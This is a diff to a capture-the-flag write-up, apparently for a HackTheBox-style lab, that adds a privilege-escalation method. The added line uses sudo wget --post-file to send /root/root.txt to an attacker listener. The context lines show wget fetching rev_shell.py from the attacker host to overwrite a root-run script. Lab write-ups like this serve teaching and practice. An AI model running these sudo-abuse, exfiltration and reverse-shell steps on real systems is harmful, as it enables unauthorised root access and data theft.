@@ -149,6 +149,12 @@ sudo wget --use-askpass=$TF 0
 
 
 ### Method 2:
++ On **sammy**'s session, send **root.txt** to your kali attack vm: `sudo wget --post-file /root/root.txt http://10.10.14.8:5555/`
+
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/04c2786a-bd1c-4846-b1e3-660ffdaa24ed)
+
+
+### Method 3:
 + On **sunny**'s session, view the list of allowed commands that the user can run with root privileges: `sudo -ll`
 + We don't have write access to the script, so we can't escalate our privileges using it.
 
@@ -174,7 +180,7 @@ sudo wget http://10.10.14.8:8000/rev_shell.py -O /root/troll
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ee1abc40-ef93-490b-8150-376696d7e990)
 
 + **Terminal [2][5]:** Get the root shell.
-+ On method 2, be quick. That’s because of the overwrite script resetting troll to it's original self every 5 seconds.
++ On method 3, be quick. That’s because of the overwrite script resetting troll to it's original self every 5 seconds.
 + After getting the root shell, there's **overwrite** script in the root home directory in the below.
 + **troll** is set back to its default state regularly every 5 seconds.
 
